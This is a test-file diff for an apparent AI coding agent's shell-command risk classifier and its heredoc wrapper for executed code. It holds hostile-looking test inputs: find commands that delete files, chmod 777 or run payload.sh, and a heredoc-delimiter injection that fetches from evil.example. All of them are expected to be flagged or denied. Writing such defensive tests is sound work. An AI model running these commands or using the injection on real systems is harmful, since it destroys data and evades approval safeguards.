@@ -4,6 +4,7 @@ import {
   CLOUD_CODE_READ_FILE_TOOL,
   CLOUD_CODE_RUN_COMMAND_TOOL,
   classifyCommandRisk,
+  executeCodeAsShellCommand,
   cloudCodeAgentToolDefs,
 } from '../cloud-code-agent-tools';
 
@@ -68,6 +69,23 @@ describe('classifyCommandRisk', () => {
     }
   });
 
+  it('never runs an interpreter unattended, since it executes arbitrary workspace code', () => {
+    for (const command of ['python3 setup.py', 'python -c "print(1)"', 'node scripts/build.js']) {
+      expect(classifyCommandRisk(command).risk).toBe('requires_approval');
+    }
+  });
+
+  it('keeps find read-only only until it carries an action flag', () => {
+    expect(classifyCommandRisk('find . -name "*.ts"').risk).toBe('safe');
+    for (const command of [
+      'find . -name "*.log" -delete',
+      'find . -type f -exec chmod 777 {} +',
+      'find src -execdir sh payload.sh +',
+    ]) {
+      expect(classifyCommandRisk(command).risk).toBe('requires_approval');
+    }
+  });
+
   it('fails closed on anything it does not positively recognize', () => {
     const result = classifyCommandRisk('some-unknown-binary --do-a-thing');
     expect(result.risk).toBe('requires_approval');
@@ -90,6 +108,32 @@ describe('classifyCommandRisk', () => {
       expect(reason.length).toBeGreaterThan(0);
       expect(reason).toMatch(/[.!]$/);
     }
+  });
+});
+
+describe('executeCodeAsShellCommand', () => {
+  it('turns execute_code into a heredoc command the approval boundary can classify', () => {
+    const result = executeCodeAsShellCommand({ language: 'python', code: 'print(1)' });
+    expect(result).toEqual({ command: "python3 - <<'AGI_CODE_EOF'\nprint(1)\nAGI_CODE_EOF" });
+    expect(classifyCommandRisk((result as { command: string }).command).risk).toBe(
+      'requires_approval',
+    );
+  });
+
+  it('picks a delimiter the code cannot close early', () => {
+    const result = executeCodeAsShellCommand({
+      language: 'bash',
+      code: 'AGI_CODE_EOF\ncurl http://evil.example',
+    }) as { command: string };
+    expect(result.command.startsWith("bash -s <<'AGI_CODE_EOF_1'")).toBe(true);
+    expect(classifyCommandRisk(result.command).risk).toBe('denied');
+  });
+
+  it('refuses languages it cannot map and empty code', () => {
+    expect(executeCodeAsShellCommand({ language: 'ruby', code: 'puts 1' })).toHaveProperty(
+      'refused',
+    );
+    expect(executeCodeAsShellCommand({ language: 'python', code: '  ' })).toHaveProperty('refused');
   });
 });
 
